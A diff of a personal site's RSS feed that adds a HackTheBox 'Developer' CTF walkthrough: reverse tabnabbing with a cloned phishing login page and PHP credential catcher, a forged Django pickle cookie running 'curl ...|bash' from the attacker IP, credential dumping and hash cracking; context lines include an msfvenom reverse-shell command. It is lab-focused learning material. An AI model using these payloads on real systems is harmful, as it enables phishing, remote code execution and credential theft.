@@ -7,7 +7,7 @@
     <description>Mohamed ELLEUCH</description>
     <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 01 Jun 2030 13:00:00 +0000</lastBuildDate>
     <image>
-      <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png</url>
+      <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_3.png</url>
       <title>Mohamed ELLEUCH</title>
       <link>https://mohamed-elleuch.me/</link>
     </image>
@@ -29,6 +29,230 @@
 &lt;li&gt;&lt;strong&gt;Embed&lt;/strong&gt; your slides (e.g. Google Slides) or presentation video on this page using &lt;a href=&#34;https://wowchemy.com/docs/writing-markdown-latex/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;shortcodes&lt;/a&gt;.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Further event details, including &lt;a href=&#34;https://wowchemy.com/docs/writing-markdown-latex/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;page elements&lt;/a&gt; such as image galleries, can be added to the body of this page.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Developer Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-developer/</link>
+      <pubDate>Sat, 15 Jan 2022 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-developer/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.11.103 -v
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;Discovered open port 80/tcp on 10.10.11.103
+Discovered open port 22/tcp on 10.10.11.103
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;p-stylecolorgreenweb-enumeration-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enumeration &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;Seems like we have a CTF Platform&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115060502.png&#34;&gt;
+&lt;p&gt;First of all, let&amp;rsquo;s create an account&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115060642.png&#34;&gt;
+&lt;img src=&#34;Pasted image 20220115060942.png&#34;&gt;
+&lt;p&gt;We can try to solve any of the available challenges&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115061138.png&#34;&gt;
+&lt;p&gt;After submitting the flag and reloading the page we&amp;rsquo;ll have the ability to submit a walkthrough&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115061242.png&#34;&gt;
+&lt;p&gt;Reading the description, And our first assumption that we&amp;rsquo;ll be dealing with an XSS (Stealing cookies?)&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115061404.png&#34;&gt;
+&lt;p&gt;After submitting the writeup, we can check our profile page and inspect element&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115063350.png&#34;&gt;
+&lt;p&gt;We have full controll over the input, we can get an XSS with this payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;javascript:location=&amp;quot;http://10.10.14.169:8000&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;Pasted image 20220115061653.png&#34;&gt;
+&lt;p&gt;We can also try to steal cookies or attempt a CSRF, but nothing works&lt;/p&gt;
+&lt;p&gt;Another thing, is the target=&amp;quot;_blank&amp;quot;. An attack that exploits this vulnerability is the so-called &amp;ldquo;reverse tabnabbing.&amp;rdquo; It is an attack where a page linked from the target page is able to replace that page with, for example, a phishing site.&lt;/p&gt;
+&lt;p&gt;So let&amp;rsquo;s try to get the user creds&lt;/p&gt;
+&lt;h1 id=&#34;p-stylecolorredfoothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold &lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;We&amp;rsquo;ll be doing the tabnabbing part with 2 methods&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Using The Social-Engineer Toolkit (Built-in kali)&lt;/li&gt;
+&lt;li&gt;Manual phishing&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Our payload to open a new tab&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
+&amp;lt;script&amp;gt;
+if (window.opener) window.opener.parent.location.replace(&#39;http://10.10.14.169&#39;);
+if (window.parent != window) window.parent.location.replace(&#39;http://10.10.14.169&#39;);
+&amp;lt;/script&amp;gt;
+creds go brrr
+
+&amp;lt;/html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we&amp;rsquo;ll be using the Credentail Harvester Attack Method from setool
+And we&amp;rsquo;ll be cloning the &lt;code&gt;http://developer.htb/accounts/login/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Our phishing page is ready&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115071935.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s host our payload as our writeup and wait until the bot hits&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115072138.png&#34;&gt;
+&lt;p&gt;And we get a hit with the admin credentials&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115072234.png&#34;&gt;
+&lt;p&gt;Now let&amp;rsquo;s do this manually&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s the login fake page, basically i just changed all the links to developer.htb and making a post request to get.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!doctype html&amp;gt;
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+  &amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
+    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1, shrink-to-fit=no&amp;quot;&amp;gt;
+    &amp;lt;meta name=&amp;quot;description&amp;quot; content=&amp;quot;&amp;quot;&amp;gt;
+    &amp;lt;meta name=&amp;quot;author&amp;quot; content=&amp;quot;&amp;quot;&amp;gt;
+    &amp;lt;link rel=&amp;quot;icon&amp;quot; href=&amp;quot;http://developer.htb/img/favicon.ico&amp;quot;&amp;gt;
+    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;http://developer.htb/static/css/jquery.toasts.css&amp;quot;&amp;gt;
+    &amp;lt;script src=&amp;quot;http://developer.htb/static/js/all.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+    &amp;lt;script src=&amp;quot;http://developer.htb/static/js/jquery-3.2.1.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+    &amp;lt;title&amp;gt;Login | Developer.HTB&amp;lt;/title&amp;gt;
+
+    &amp;lt;!-- Bootstrap core CSS --&amp;gt;
+    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;http://developer.htb/static/css/bootstrap.min.css&amp;quot;&amp;gt;
+
+    &amp;lt;!-- Custom styles for this template --&amp;gt;
+    &amp;lt;link href=&amp;quot;http://developer.htb/static/css/signin.css&amp;quot; rel=&amp;quot;stylesheet&amp;quot;&amp;gt;
+  &amp;lt;/head&amp;gt;
+
+  &amp;lt;body class=&amp;quot;text-center&amp;quot;&amp;gt;
+ 
+    &amp;lt;form class=&amp;quot;form-signin&amp;quot; action=&amp;quot;get.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
+    	&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;csrfmiddlewaretoken&amp;quot; value=&amp;quot;EtgiMuENxtULw23q6tAJaiYTda9x78ML3O9xhInMMt31vVCLeWSAMg9KlBdNvOOT&amp;quot;&amp;gt;
+      &amp;lt;img class=&amp;quot;mb-4&amp;quot; src=&amp;quot;http://developer.htb/static/img/logo.png&amp;quot; alt=&amp;quot;&amp;quot; width=&amp;quot;72&amp;quot; height=&amp;quot;72&amp;quot;&amp;gt;
+      &amp;lt;h1 class=&amp;quot;h3 mb-3 font-weight-normal&amp;quot;&amp;gt;Welcome back!&amp;lt;/h1&amp;gt;
+      &amp;lt;label for=&amp;quot;uname&amp;quot; class=&amp;quot;sr-only&amp;quot;&amp;gt;User Name&amp;lt;/label&amp;gt;
+      &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;id_login&amp;quot; name=&amp;quot;login&amp;quot; placeholder=&amp;quot;Username&amp;quot; class=&amp;quot;form-control&amp;quot; required autofocus&amp;gt;
+      &amp;lt;label for=&amp;quot;password&amp;quot; class=&amp;quot;sr-only&amp;quot;&amp;gt;Password&amp;lt;/label&amp;gt;
+      &amp;lt;input type=&amp;quot;password&amp;quot; id=&amp;quot;id_password&amp;quot; name=&amp;quot;password&amp;quot; placeholder=&amp;quot;Password&amp;quot; class=&amp;quot;form-control&amp;quot; required&amp;gt;
+
+      
+      &amp;lt;button id=&amp;quot;loginbtn&amp;quot; class=&amp;quot;btn btn-lg btn-primary btn-block&amp;quot; type=&amp;quot;submit&amp;quot;&amp;gt;Sign in&amp;lt;/button&amp;gt;
+          &amp;lt;a href=&amp;quot;http://developer.htb/accounts/password/reset/&amp;quot; class=&amp;quot;auth-link&amp;quot;&amp;gt;Forgot password?&amp;lt;/a&amp;gt;
+		&amp;lt;div class=&amp;quot;text-center mt-4 font-weight-light&amp;quot;&amp;gt; Don&#39;t have an account? &amp;lt;a href=&amp;quot;http://developer.htb/accounts/signup/&amp;quot; &amp;gt;Click here!&amp;lt;/a&amp;gt;      
+      &amp;lt;p class=&amp;quot;mt-5 mb-3 text-muted&amp;quot;&amp;gt;&amp;amp;copy; Developer.HTB 2021&amp;lt;/p&amp;gt;
+    &amp;lt;/form&amp;gt;
+
+&amp;lt;script src=&amp;quot;http://developer.htb/static/js/jquery.toast.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 
+&amp;lt;script&amp;gt;
+
+
+&amp;lt;/script&amp;gt;
+  &amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For my get.php, it&amp;rsquo;s just a very simple php script to store the creds in my local machine&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+system(&#39;echo &#39;.$_POST[&#39;login&#39;].&#39; &amp;gt; /home/kali/phish/user&#39;);
+system(&#39;echo &#39;.$_POST[&#39;password&#39;].&#39; &amp;gt; /home/kali/phish/pass&#39;);
+?
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We&amp;rsquo;ll need to submit the writeup again and wait until it the bots hits&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115072736.png&#34;&gt;
+&lt;img src=&#34;Pasted image 20220115072800.png&#34;&gt;
+&lt;p&gt;Now we can login as admin, and access the login panel&lt;/p&gt;
+&lt;img src =&#34;Pasted image 20220115075618.png&#34;&gt;
+&lt;p&gt;We can check the registered users&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115080058.png&#34;&gt;
+&lt;p&gt;Also we can find a subdomain in the sites page&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115080200.png&#34;&gt;
+&lt;p&gt;We can try using the same password we got from tabnabbing with the users we got
+&lt;img src=&#34;Pasted image 20220115080605.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;jacob@developer.htb:SuperSecurePassword@HTB2021&lt;/code&gt; works&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115080758.png&#34;&gt;
+&lt;p&gt;Searching about sentry related vulnerabilities, This blog post seems interesting
+&lt;a href=&#34;https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/&lt;/a&gt;
+Which explains how to get RCE. But we need to somehow trigger a 500 to get the secret key.&lt;/p&gt;
+&lt;p&gt;We can make sure that debug is on by triggering a 404&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115081755.png&#34;&gt;
+&lt;p&gt;And After some enumeration, we can notice that a 500 gets triggers when we try to delete a project&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115081858.png&#34;&gt;
+&lt;img src=&#34;Pasted image 20220115081930.png&#34;&gt;
+&lt;p&gt;Searching for secret, we can find it&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115082058.png&#34;&gt;
+&lt;p&gt;We can now forge our cookie&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
+#!/usr/bin/python
+import django.core.signing, django.contrib.sessions.serializers
+from django.http import HttpResponse
+import cPickle
+import os
+
+SECRET_KEY=&#39;c7f3a64aa184b7cbb1a7cbe9cd544913&#39;
+#Initial cookie I had on sentry when trying to reset a password
+cookie=&amp;quot;.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQqVllf6mod5l3t6uCZGcAEFSlKLS5Lz87MzU8FayvOLslNTQoXiE0tLMuJLi1OL4pMSk7NT81JClSDG6ZWWZOYU64Hk9VxzEzNzHIEsJ6gaXiR9mSnerKV6AAnPM_Q:1n8imJ:P2c5oMRqvOAwJPD3sUauC2cUvwY&amp;quot;
+newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=&#39;django.contrib.sessions.backends.signed_cookies&#39;)
+class PickleRce(object):
+    def __reduce__(self):
+        return (os.system,(&amp;quot;curl 10.10.14.169:9005/x|bash&amp;quot;,))
+newContent[&#39;testcookie&#39;] = PickleRce()
+
+print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=&#39;django.contrib.sessions.backends.signed_cookies&#39;,compress=True)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;Pasted image 20220115082611.png&#34;&gt;
+&lt;p&gt;We change our sentryid cookie and reload the page to a shell&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115082704.png&#34;&gt;
+&lt;h1 id=&#34;p-stylecolorreduser-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User &lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s  first start by checking the sentry config&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/etc/sentry/sentry.conf.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;DATABASES = {
+    &#39;default&#39;: {
+        &#39;ENGINE&#39;: &#39;sentry.db.postgres&#39;,
+        &#39;NAME&#39;: &#39;sentry&#39;,
+        &#39;USER&#39;: &#39;sentry&#39;,
+        &#39;PASSWORD&#39;: &#39;SentryPassword2021&#39;,
+        &#39;HOST&#39;: &#39;localhost&#39;,
+        &#39;PORT&#39;: &#39;&#39;,
+    }S
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;Pasted image 20220115083353.png&#34;&gt;
+&lt;p&gt;We can list databases with \list&lt;/p&gt;
+&lt;img src=&#39;Pasted image 20220115083506.png&#39;&gt;
+&lt;p&gt;Let&amp;rsquo;s use sentry databse (\c sentry)&lt;/p&gt;
+&lt;p&gt;and list tables&lt;/p&gt;
+ &lt;img src=&#34;Pasted image 20220115083606.png&#34;&gt;
+&lt;p&gt;Now let&amp;rsquo;s extract the usernames &amp;amp; passwords&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select username,password from auth_user;
+&lt;/code&gt;&lt;/pre&gt;
+ &lt;img src=&#34;Pasted image 20220115083742.png&#34;&gt;
+&lt;pre&gt;&lt;code&gt;karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=
+ admin@developer.ctf | pbkdf2_sha256$12000$xU0iVXVGmAV7$gy2g4hGVcbrzo8fPXLxuy0YUqsCqoJ47HPaPMaizZ8g=
+ jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts=
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s attempt to crack them&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;hashcat -m 10000 hash /usr/share/wordlists/rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;Pasted image 20220115084217.png&#34;&gt;
+&lt;p&gt;And we&amp;rsquo;re able to crack karl&amp;rsquo;s password&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;karl:insaneclownposse&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#39;Pasted image 20220115084336.png&#39;&gt;
+&lt;h1 id=&#34;p-stylecolorredroot-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root &lt;/p&gt;&lt;/h1&gt;
+&lt;img src=&#34;Pasted image 20220115084431.png&#34;&gt;
+&lt;img src=&#34;Pasted image 20220115084713.png&#34;&gt;
+&lt;img src=&#34;Pasted image 20220115084745.png&#34;&gt;
+&lt;p&gt;Looking at the size of the binary, we can assume it&amp;rsquo;s either rust or golang.&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ll be transfering the binary to my windows10 and open the binary with ida&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115085919.png&#34;&gt;
+&lt;p&gt;Reading through, We can see that an AES-128 is being occured&lt;/p&gt;
+&lt;p&gt;Where v27 is the key  and v28 is the IV&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115090106.png&#34;&gt;
+&lt;img src=&#34;Pasted image 20220115090644.png&#34;&gt;
+&lt;p&gt;Here we get both the IV And Key
+Key: a3e832345c7991619e20d43dbef4f5d5
+IV: 761F59E3D9D2959AA79855DC0620816A&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115090739.png&#34;&gt;
+&lt;p&gt;Now we need to find the cipher text&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115090931.png&#34;&gt;
+&lt;p&gt;Checking again the IDA view&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115091010.png&#34;&gt;
+CT: FE 1B 25 F0 80 6A 97 CA 78 80 FD 58 FC 5C 20 23 6C A2 DB D0 E5 02 B5 FA EB C0AF 3A 9F 27 15 2C 
+&lt;p&gt;Let&amp;rsquo;s use cyberchef to decrypt it&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115092506.png&#34;&gt;
+`RustForSecurity@Developer@2021:)`
+&lt;img src=&#34;Pasted image 20220115092610.png&#34;&gt;
+&lt;p&gt;We copy  our public ssh key and ssh as root&lt;/p&gt;
+&lt;img src=&#34;Pasted image 20220115092813.png&#34;&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
 </description>
     </item>
     
@@ -193,11 +417,11 @@ console.log(&#39;Listening on port 3000...&#39;);
 &lt;p&gt;There is an interesting /upload endpoint, let&amp;rsquo;s try if we can upload anything! but sadly that didn&amp;rsquo;t work, we didn&amp;rsquo;t have permissions&lt;/p&gt;
 &lt;p&gt;After searching a bit we can find that loadsh 4.17.4 is vulnerable to Prototype Pollution&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://snyk.io/test/npm/lodash/4.17.4&#34;&gt;https://snyk.io/test/npm/lodash/4.17.4&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://snyk.io/test/npm/lodash/4.17.4&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://snyk.io/test/npm/lodash/4.17.4&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;And also google-cloudstorage-commands is vulnerable to RCE&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431&#34;&gt;https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;The next step to do now is pretty straightforward after knowing these 2 exploits!&lt;/p&gt;
 &lt;p&gt;The /upload endpoint is what we&amp;rsquo;ll be looking for now! It will be enough to get us into the machine&lt;/p&gt;
@@ -390,7 +614,7 @@ certificate-controller-token-thnxw               kubernetes.io/service-account-t
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Now it&amp;rsquo;s pretty much over!&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation&#34;&gt;https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;The only think left to check is if we&amp;rsquo;re able to create pods&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;./kc --token=&amp;lt;token&amp;gt; auth can-i create pod
@@ -736,7 +960,7 @@ We only have a pdf file!
 &lt;p&gt;The Heedv1 app is build with &lt;code&gt;electron-builder&lt;/code&gt; and also we can drop updates in the client folders in the smb and it get executed.
 Searching in  google for an electron builder update rce, we can find an interesting&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&#34;&gt;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Let&amp;rsquo;s first create our shell with the name &amp;ldquo;s&amp;rsquo;hell.exe&amp;rdquo; to bypass the signature&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp  lhost=10.10.14.5 lport=9001 -f exe -o &amp;quot;s&#39;hell.exe&amp;quot;
@@ -761,7 +985,7 @@ sha512: CZsOB2[-SNIP-]2tW5UhzwqzLVkkpzAbuIw==
 &lt;img src=&#34;portable.png&#34;&gt;
 &lt;p&gt;We  can copy the whole folder and try to retrieve the encrypted like the machine &lt;code&gt;sharp&lt;/code&gt; but let&amp;rsquo;s keep enumerating!&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/49409&#34;&gt;https://www.exploit-db.com/exploits/49409&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/49409&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.exploit-db.com/exploits/49409&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;img src=&#34;redis.png&#34;&gt;
 &lt;p&gt;We can see that Redis is installed, we can grab the redis password from the config file&lt;/p&gt;
@@ -773,7 +997,7 @@ sha512: CZsOB2[-SNIP-]2tW5UhzwqzLVkkpzAbuIw==
 &lt;pre&gt;&lt;code&gt;sudo apt-get install redis-tools
 &lt;/code&gt;&lt;/pre&gt;
 &lt;blockquote&gt;
-&lt;p&gt;A very good ressource, i&amp;rsquo;ll use everything from here &lt;a href=&#34;https://book.hacktricks.xyz/pentesting/6379-pentesting-redis&#34;&gt;https://book.hacktricks.xyz/pentesting/6379-pentesting-redis&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;A very good ressource, i&amp;rsquo;ll use everything from here &lt;a href=&#34;https://book.hacktricks.xyz/pentesting/6379-pentesting-redis&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://book.hacktricks.xyz/pentesting/6379-pentesting-redis&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Let&amp;rsquo;s dump the database&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;info
@@ -838,25 +1062,25 @@ print(&#39;[+] Decrypted Password: &#39;+decode(&#39;Odh7N3L9aVQ8/srdZgG2hIR0SSJ
 &lt;hr&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;p-stylecolorred-cyber-security-introduction-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; Cyber Security Introduction &lt;/p&gt;&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&#34;unknown_infected.png&#34; width=&#34;400&#34; height=&#34;500&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;unknown_infected.png&#34; width=&#34;400&#34; height=&#34;500&#34; /&gt;
 &lt;p&gt;This section contains only one room &lt;code&gt;Learning Cyber Security&lt;/code&gt;  which gives a General Introduction to Cyber Security, how important some aspects are in this field and an opportunity to get your hands dirty!&lt;/p&gt;
 &lt;hr&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;p-stylecolorred-network-fundamentals-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; Network Fundamentals &lt;/p&gt;&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&#34;network-vulnerabilities.png&#34; width=&#34;400&#34; height=&#34;500&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;network-vulnerabilities.png&#34; width=&#34;400&#34; height=&#34;500&#34; /&gt;
 &lt;p&gt;This is the heart and soul of it, It&amp;rsquo;s understanding how devices interact with each other and how data gets from point X to point Y. A strong knowledge &amp;amp; foundation in networking will you a very good troubleshooter whether you&amp;rsquo;re red teaming, defending or IT ops. You&amp;rsquo;ll have a general idea at first, few basics that you need to know to start building your knowledge ( What&amp;rsquo;s a protocol and few examples of it, .. I&amp;rsquo;ll not spoil more I&amp;rsquo;ll let you discover everything else by yourself).&lt;br&gt;
 And surely you&amp;rsquo;ll learn about the OSI Model which is one of th conceptual model that governs the computer networking ( There is the TCP/IP Model aswell). You&amp;rsquo;ll also understand what a packet or a frame and how data is divided into small pieces (PDU SDU.. ) And finally you&amp;rsquo;ll learn how to expend your network.&lt;/p&gt;
 &lt;hr&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;p-stylecolorred-how-the-web-works-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; How The Web Works &lt;/p&gt;&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&#34;application-vulnerabilities.png&#34; width=&#34;400&#34; height=&#34;500&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;application-vulnerabilities.png&#34; width=&#34;400&#34; height=&#34;500&#34; /&gt;
 &lt;p&gt;This section is the most interesting one for me and i am sure that beginners will benefit from the amount of knowledge that they&amp;rsquo;re presenting. It covers so many aspects of the web and how it works!&lt;br&gt;
 This section will not only give a solid understanding but also an opportunity to practice what you have learnt! &lt;br&gt;
 If i started my pentesting journey with these rooms that would have saved a lot of time for me!&lt;/p&gt;
 &lt;hr&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;p-stylecolorred-linux-fundamentals-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; Linux Fundamentals &lt;/p&gt;&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&#34;linux-fundamentals.png&#34; width=&#34;400&#34; height=&#34;500&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;linux-fundamentals.png&#34; width=&#34;400&#34; height=&#34;500&#34; /&gt;
 &lt;p&gt;As a beginner you must learn linux or else you&amp;rsquo;re going nowhere in this field! They are many roles within cyber security that requires you have basic &amp;amp; fondamental understanding of linux and how it works! You don&amp;rsquo;t need to be a linux expert to excel here by all means  but having a fairly good understanding about how this operating system works will greatly help in your journey! &lt;br&gt;
 And this section will teach almost all the basics that you need to start getting your hands dirty in the other labs in this platforme or maybe another path.
 &lt;br&gt;
@@ -864,7 +1088,7 @@ After doing this section i highly recommand trying the Linux challenges room! Yo
 &lt;hr&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;p-stylecolorred-windows-fundamentals-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; Windows Fundamentals &lt;/p&gt;&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&#34;hacking-windows2.png&#34; width=&#34;400&#34; height=&#34;500&#34; /&gt;&lt;/p&gt;
